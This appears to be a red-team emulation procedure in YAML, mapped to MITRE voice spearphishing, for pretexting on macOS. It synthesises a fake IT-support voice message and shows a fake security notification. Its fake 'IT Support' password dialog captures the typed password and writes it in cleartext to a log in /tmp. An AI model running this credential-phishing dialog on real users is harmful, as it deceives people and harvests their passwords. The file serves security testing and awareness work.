---
api_version: 2.0
uuid: 4d8e6c1f-7a3b-5e0c-9f2d-3a6b7c1e4f2a
name: Pretexting Phone Calls
authors:
  - mbhatt
description: |
  Executes pretexting social engineering techniques using native macOS capabilities.
  Uses the say command for voice synthesis of a pretexting script, osascript to
  display fake IT support notifications and credential dialogs, and afplay for
  alert sounds to create a convincing pretexting scenario.

mitre:
  tactics:
    - "TA0001 Initial Access"
  techniques:
    - "T1566 Phishing"
  subtechniques:
    - "T1566.004 Phishing: Spearphishing Voice"

requirements:
  platforms:
    - os: darwin

args:
  - name: pretexting_message
    description: "Message used in the pretexting script"
    type: string
    default: "This is IT support calling about your account"

steps:
  - name: synthesize_pretexting_voice_message
    description: Use the say command to synthesize a pretexting script as a voice message
    inline: |
      mkdir -p /tmp/ttp_pretext
      echo "[+] Synthesizing pretexting voice message..."
      say -v Samantha "{{ .Args.pretexting_message }}. We have detected unusual activity on your workstation. For security purposes, we need to verify your credentials. Please have your username and password ready." -o /tmp/ttp_pretext/pretext_message.aiff --data-format=LEI16@22050
      echo "[+] Voice message saved to /tmp/ttp_pretext/pretext_message.aiff"
      file /tmp/ttp_pretext/pretext_message.aiff

  - name: display_fake_it_support_notification
    description: Use osascript to display a fake IT support notification
    inline: |
      osascript -e 'display notification "Your workstation requires an urgent security patch. IT Support will contact you shortly." with title "IT Support" subtitle "Security Alert - Action Required"'
      echo "[+] Fake IT support notification displayed in Notification Center"

  - name: display_fake_credential_dialog
    description: Display a fake IT Support dialog box requesting credentials
    inline: |
      echo "[+] Displaying fake IT Support credential dialog..."
      RESPONSE=$(osascript -e 'try
        set userInput to display dialog "IT Support: We need to verify your account to apply a critical security patch. Please enter your network password:" default answer "" with hidden answer with title "IT Support - Security Patch" with icon caution giving up after 15
        return text returned of userInput
      on error
        return "DIALOG_CANCELLED"
      end try' 2>/dev/null || echo "DIALOG_DISMISSED")
      echo "[+] IT Support dialog response captured: ${RESPONSE}"
      TIMESTAMP=$(date +%Y%m%d_%H%M%S)
      echo "${TIMESTAMP} - Credential dialog response: ${RESPONSE}" >> /tmp/ttp_pretext/interaction.log

  - name: play_alert_sound
    description: Play an alert sound using afplay to draw attention
    inline: |
      echo "[+] Playing system alert sound..."
      afplay /System/Library/Sounds/Sosumi.aiff 2>/dev/null || afplay /System/Library/Sounds/Ping.aiff 2>/dev/null || echo "[!] No system sounds available"
      echo "[+] Alert sound played"

  - name: check_communication_availability
    description: Check if FaceTime and communication apps are available
    inline: |
      echo "[+] Checking communication app availability:"
      if [ -d "/Applications/FaceTime.app" ]; then
        echo "  FaceTime: Available"
      else
        echo "  FaceTime: Not found"
      fi
      if [ -d "/Applications/Messages.app" ] || [ -d "/System/Applications/Messages.app" ]; then
        echo "  Messages: Available"
      else
        echo "  Messages: Not found"
      fi
      mdfind "kMDItemKind == 'Application'" 2>/dev/null | grep -iE "(zoom|teams|slack|webex)" | head -5 || echo "  No video conferencing apps detected"
      echo ""
      echo "[+] Interaction log:"
      cat /tmp/ttp_pretext/interaction.log 2>/dev/null || echo "  No interactions logged"
      echo "[+] PASS: Pretexting scenario executed"
    cleanup:
      inline: |
        rm -rf /tmp/ttp_pretext
        echo "[+] Cleanup: Pretext files removed"

tests:
  - name: pretexting_phone_calls_test
    dry_run: true
